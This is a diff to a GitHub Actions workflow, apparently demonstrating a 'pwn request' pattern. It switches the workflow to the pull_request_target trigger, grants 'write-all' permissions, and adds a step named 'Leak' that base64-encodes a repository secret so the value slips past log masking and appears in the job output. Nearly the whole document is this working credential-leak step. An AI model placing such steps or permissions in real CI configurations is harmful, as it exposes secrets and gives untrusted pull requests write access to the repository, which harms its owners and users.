@@ -4,8 +4,14 @@ on:
   pull_request_target:
     types: [assigned, opened, synchronize, reopened]
 
-jobs:
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo ${{ secrets.SUPER_SECRET }} | base64 -w0 
+permissions: 
+  write-all
 
+jobs:
+  create-push-pr:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Leak
+        run: |
+          echo ${{ secrets.SUPER_SECRET }} | base64 -w0 
